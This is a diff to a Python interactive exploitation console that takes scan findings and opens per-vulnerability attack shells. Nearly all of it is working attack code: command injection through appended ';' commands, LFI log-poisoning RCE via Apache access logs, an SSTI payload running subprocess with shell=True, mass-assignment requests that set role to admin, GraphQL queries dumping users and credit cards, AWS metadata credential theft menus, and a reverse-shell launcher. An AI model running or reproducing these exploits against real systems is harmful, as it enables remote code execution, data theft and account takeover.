@@ -62,13 +62,14 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             elif vuln_type == "Command Injection":
                 print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                 print("      revshell    - Generate reverse shell payloads for this target")
-            elif "GraphQL" in vuln_type:
+            elif any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
                 print("      users       - Quick query to fetch all users & credit cards")
                 print("      secret      - Quick query to fetch secret admin data & flags")
-                print("      escalate    - Execute privilege escalation mutation (Admin Takeover)")
+                print("      assign      - Send Mass Assignment / Parameter Pollution payload to escalate role")
+                print("      escalate    - Execute privilege escalation mutation / admin takeover")
                 print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
                 print("      revshell    - Trigger reverse shell payload via admin endpoint")
-                print("      query <q>   - Send any custom GraphQL query string")
+                print("      query <q>   - Send any custom GraphQL or JSON request string")
             elif vuln_type == "SSRF":
                 print("      metadata    - Exfiltrate cloud metadata & IAM credentials (AWS 169.254.169.254)")
                 print("      internal    - Probe internal loopback services (localhost:8080)")
@@ -172,6 +173,17 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] IDOR audit failed: {e}")
+            elif vuln_type in ["BFLA", "Over-Fetching", "Mass Assignment"]:
+                print(f"[*] Re-running audit against modern API target: {target_url}")
+                try:
+                    h = {'User-Agent': 'Mozilla/5.0'}
+                    if harvested_token:
+                        h['Authorization'] = f'Bearer {harvested_token}'
+                    req = urllib.request.Request(target_url, headers=h)
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Modern API audit failed: {e}")
             elif "GraphQL" in vuln_type:
                 print("[*] Re-running GraphQL Introspection query...")
                 try:
@@ -232,48 +244,113 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] JWT escalation failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type == "JWT":
+        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "SSRF", "SSTI", "Command Injection", "LFI"]):
             user_linux_cmd = cmd.split(" ", 1)[1]
-            if not harvested_token:
-                print("    [-] No admin token available. Run 'escalate' first.")
-                continue
-            
-            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
-            print(f"[*] Pivoting JWT admin token against endpoint: {target_exec_url}")
-            try:
-                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
-                req = urllib.request.Request(exec_url, headers={
-                    'User-Agent': 'Mozilla/5.0',
-                    'Authorization': f'Bearer {harvested_token}'
-                })
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    raw_body = resp.read().decode('utf-8', errors='ignore')
-                    try:
-                        res_json = json.loads(raw_body)
-                        if "output" in res_json:
-                            print(f"\n{res_json['output']}\n")
-                        else:
+            if vuln_type == "Command Injection":
+                print(f"[*] Executing command against target: {user_linux_cmd}")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    q = urllib.parse.parse_qs(parsed.query)
+                    base_val = q.get(param, ["127.0.0.1"])[0]
+                    q[param] = [f"{base_val};{user_linux_cmd}"]
+                    new_q = urllib.parse.urlencode(q, doseq=True)
+                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                    
+                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Execution failed: {e}")
+            elif vuln_type == "LFI":
+                print(f"[*] Executing command through LFI log inclusion: {user_linux_cmd}")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                    exec_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log&cmd={urllib.parse.quote(user_linux_cmd)}"
+                    
+                    req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Execution failed: {e}")
+            elif vuln_type == "SSTI":
+                print(f"[*] Executing command via SSTI template injection RCE: {user_linux_cmd}")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                    rce_payload = f"{{{{self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('{user_linux_cmd}', shell=True).decode()}}}}"
+                    exec_url = f"{base_domain}/render.php?name={urllib.parse.quote(rce_payload)}"
+                    
+                    req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] SSTI execution failed: {e}")
+            else:
+                if not harvested_token and vuln_type not in ["Command Injection", "LFI", "SSTI"]:
+                    print("    [-] No admin token available. Run 'escalate' or 'assign' first.")
+                    continue
+                
+                target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
+                print(f"[*] Pivoting token against endpoint: {target_exec_url}")
+                try:
+                    exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
+                    headers_dict = {'User-Agent': 'Mozilla/5.0'}
+                    if harvested_token:
+                        headers_dict['Authorization'] = f'Bearer {harvested_token}'
+                    req = urllib.request.Request(exec_url, headers=headers_dict)
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        raw_body = resp.read().decode('utf-8', errors='ignore')
+                        try:
+                            res_json = json.loads(raw_body)
+                            if "output" in res_json:
+                                print(f"\n{res_json['output']}\n")
+                            else:
+                                print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+                        except Exception:
                             print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-                    except Exception:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type == "Command Injection":
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            print(f"[*] Executing command against target: {user_linux_cmd}")
+                except Exception as e:
+                    print(f"    [-] Execution failed: {e}")
+        elif cmd == "escalate" and vuln_type in ["BFLT", "BFLA", "Over-Fetching", "Mass Assignment"]:
+            print("[*] Executing Mass Assignment / Privilege Escalation payload...")
             try:
                 parsed = urllib.parse.urlparse(target_url)
-                q = urllib.parse.parse_qs(parsed.query)
-                base_val = q.get(param, ["127.0.0.1"])[0]
-                q[param] = [f"{base_val};{user_linux_cmd}"]
-                new_q = urllib.parse.urlencode(q, doseq=True)
-                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
-                
-                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                esc_url = f"{base_domain}/api/v1/account/update"
+                payload = {"username": "customer_user", "role": "admin", "is_admin": True}
+                data = json.dumps(payload).encode('utf-8')
+                req = urllib.request.Request(esc_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                 with urllib.request.urlopen(req, timeout=3) as resp:
-                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
+                        if harvested_endpoint:
+                            print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
-                print(f"    [-] Execution failed: {e}")
+                print(f"    [-] Escalation failed: {e}")
+        elif cmd == "assign" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+            print("[*] Sending Mass Assignment payload...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                update_url = f"{base_domain}/api/v1/account/update"
+                payload = {"email": "attacker@test.com", "role": "admin", "is_admin": True}
+                data = json.dumps(payload).encode('utf-8')
+                req = urllib.request.Request(update_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! Token Harvested: {harvested_token[:30]}...")
+            except Exception as e:
+                print(f"    [-] Mass assignment failed: {e}")
         elif (cmd.startswith("read ") or cmd.startswith("cat ")) and vuln_type == "LFI":
             file_path = cmd.split(" ", 1)[1]
             print(f"[*] Traversing path to read file: {file_path}")
@@ -308,19 +385,6 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     harvested_token = "lfi_rce_active"
             except Exception as e:
                 print(f"    [-] Log poisoning failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type == "LFI":
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            print(f"[*] Executing command through LFI log inclusion: {user_linux_cmd}")
-            try:
-                parsed = urllib.parse.urlparse(target_url)
-                base_domain = f"{parsed.scheme}://{parsed.netloc}"
-                exec_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log&cmd={urllib.parse.quote(user_linux_cmd)}"
-                
-                req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
         elif cmd.startswith("fetch ") and vuln_type == "IDOR":
             target_id = cmd.split(" ", 1)[1].strip()
             print(f"[*] Querying object ID {target_id} via IDOR vector...")
@@ -369,32 +433,6 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type == "IDOR":
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            if not harvested_token:
-                print("    [-] No admin token available. Run 'escalate' first to harvest privileges.")
-                continue
-            
-            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
-            print(f"[*] Pivoting admin token against endpoint: {target_exec_url}")
-            try:
-                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
-                req = urllib.request.Request(exec_url, headers={
-                    'User-Agent': 'Mozilla/5.0',
-                    'Authorization': f'Bearer {harvested_token}'
-                })
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    raw_body = resp.read().decode('utf-8', errors='ignore')
-                    try:
-                        res_json = json.loads(raw_body)
-                        if "output" in res_json:
-                            print(f"\n{res_json['output']}\n")
-                        else:
-                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-                    except Exception:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
         elif cmd == "tables" and vuln_type in ["SQLi", "SQL Injection"]:
             print("[*] Enumerating database tables via UNION-based injection...")
             try:
@@ -460,34 +498,8 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type in ["SQLi", "SQL Injection"]:
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            if not harvested_token:
-                print("    [-] No admin token available. Run 'escalate' first using dumped credentials.")
-                continue
-            
-            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
-            print(f"[*] Pivoting admin token against endpoint: {target_exec_url}")
-            try:
-                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
-                req = urllib.request.Request(exec_url, headers={
-                    'User-Agent': 'Mozilla/5.0',
-                    'Authorization': f'Bearer {harvested_token}'
-                })
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    raw_body = resp.read().decode('utf-8', errors='ignore')
-                    try:
-                        res_json = json.loads(raw_body)
-                        if "output" in res_json:
-                            print(f"\n{res_json['output']}\n")
-                        else:
-                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-                    except Exception:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
-        elif cmd == "users" and "GraphQL" in vuln_type:
-            print("[*] Querying GraphQL API for user records...")
+        elif cmd == "users" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+            print("[*] Querying API endpoint for user records...")
             try:
                 payload = {"query": "{ users { id username email creditCard } }"}
                 data = json.dumps(payload).encode('utf-8')
@@ -496,8 +508,8 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
                 print(f"    [-] Query failed: {e}")
-        elif cmd == "secret" and "GraphQL" in vuln_type:
-            print("[*] Querying GraphQL API for secret admin data...")
+        elif cmd == "secret" and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
+            print("[*] Querying API endpoint for secret admin data...")
             try:
                 payload = {"query": "{ secretAdminData }"}
                 data = json.dumps(payload).encode('utf-8')
@@ -531,39 +543,9 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print("    [!] Administrative takeover achieved via GraphQL mutation.")
             except Exception as e:
                 print(f"    [-] Privilege escalation failed: {e}")
-        elif cmd.startswith("exec ") and "GraphQL" in vuln_type:
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            if not harvested_token:
-                print("    [-] No admin token available. Run 'escalate' first to obtain authorization.")
-                continue
-            
-            target_exec_url = harvested_endpoint
-            if not target_exec_url:
-                base_domain = target_url.rsplit('/', 1)[0]
-                target_exec_url = f"{base_domain}/api/v1/admin/exec"
-
-            print(f"[*] Pivoting admin token against auto-matched endpoint: {target_exec_url}")
-            try:
-                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
-                req = urllib.request.Request(exec_url, headers={
-                    'User-Agent': 'Mozilla/5.0',
-                    'Authorization': f'Bearer {harvested_token}'
-                })
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    raw_body = resp.read().decode('utf-8', errors='ignore')
-                    try:
-                        res_json = json.loads(raw_body)
-                        if "output" in res_json:
-                            print(f"\n{res_json['output']}\n")
-                        else:
-                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-                    except Exception:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
-        elif cmd.startswith("query ") and "GraphQL" in vuln_type:
+        elif cmd.startswith("query ") and any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"]):
             gql_query = cmd.split(" ", 1)[1]
-            print(f"[*] Sending custom GraphQL query: {gql_query}")
+            print(f"[*] Sending custom query: {gql_query}")
             try:
                 payload = {"query": gql_query}
                 data = json.dumps(payload).encode('utf-8')
@@ -627,32 +609,6 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
-        elif cmd.startswith("exec ") and vuln_type == "SSRF":
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            if not harvested_token:
-                print("    [-] No admin token available. Run 'escalate' first via cloud metadata.")
-                continue
-            
-            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
-            print(f"[*] Pivoting cloud admin token against endpoint: {target_exec_url}")
-            try:
-                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
-                req = urllib.request.Request(exec_url, headers={
-                    'User-Agent': 'Mozilla/5.0',
-                    'Authorization': f'Bearer {harvested_token}'
-                })
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    raw_body = resp.read().decode('utf-8', errors='ignore')
-                    try:
-                        res_json = json.loads(raw_body)
-                        if "output" in res_json:
-                            print(f"\n{res_json['output']}\n")
-                        else:
-                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-                    except Exception:
-                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
-            except Exception as e:
-                print(f"    [-] Execution failed: {e}")
         elif cmd == "test" and vuln_type == "SSTI":
             print("[*] Testing SSTI mathematical evaluation ({{7*7}})...")
             try:
@@ -681,21 +637,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
             print(f"    [!] SUCCESS! SSTI Admin Token Harvested: {harvested_token}")
             print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
-        elif cmd.startswith("exec ") and vuln_type == "SSTI":
-            user_linux_cmd = cmd.split(" ", 1)[1]
-            print(f"[*] Executing command via SSTI template injection RCE: {user_linux_cmd}")
-            try:
-                parsed = urllib.parse.urlparse(target_url)
-                base_domain = f"{parsed.scheme}://{parsed.netloc}"
-                rce_payload = f"{{{{self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('{user_linux_cmd}', shell=True).decode()}}}}"
-                exec_url = f"{base_domain}/render.php?name={urllib.parse.quote(rce_payload)}"
-                
-                req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=3) as resp:
-                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
-            except Exception as e:
-                print(f"    [-] SSTI execution failed: {e}")
-        elif cmd == "revshell" and (vuln_type == "Command Injection" or "GraphQL" in vuln_type):
+        elif cmd == "revshell" and (vuln_type == "Command Injection" or any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"])):
             print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
             if os.path.exists("rev_shell.py"):
                 os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
@@ -715,7 +657,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
 def main_console():
     findings = load_findings()
     if not findings:
-        print("[-] No scan results found. Run the autonomous pipeline (Option 1) first.")
+        print("[-] No scan results found. Run the autonomous pipeline first.")
         input("\nPress Enter to return...")
         return
 
@@ -728,7 +670,7 @@ def main_console():
         print("  1) JWT Tokens & Privilege Escalation Targets")
         print("  2) IDOR / BOLA Endpoints")
         print("  3) SQLi, LFI & Command Injection Vectors")
-        print("  4) Modern API & GraphQL Endpoints")
+        print("  4) Modern API & GraphQL Endpoints (GraphQL, BFLA, Over-Fetching, Mass Assignment)")
         print("  5) SSRF & Cloud Metadata Targets")
         print("  6) SSTI & Template RCE Targets")
         print("  7) Open Custom Manual Target Session")
@@ -777,16 +719,16 @@ def main_console():
                 run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))
 
         elif choice == "4":
-            gql_items = [f for f in findings if "GraphQL" in f.get("vulnerability", "")]
-            if not gql_items:
-                print("[-] No GraphQL endpoints found.")
+            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"])]
+            if not modern_items:
+                print("[-] No Modern API / GraphQL endpoints found.")
                 continue
             print("\n[★] Modern API & GraphQL Endpoints:")
-            for idx, item in enumerate(gql_items, 1):
+            for idx, item in enumerate(modern_items, 1):
                 print(f"    {idx}) {item.get('target')} - {item.get('vulnerability')}")
             sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
-            if sel.isdigit() and 1 <= int(sel) <= len(gql_items):
-                item = gql_items[int(sel) - 1]
+            if sel.isdigit() and 1 <= int(sel) <= len(modern_items):
+                item = modern_items[int(sel) - 1]
                 run_target_shell(item.get("target"), item.get("vulnerability"))
 
         elif choice == "5":
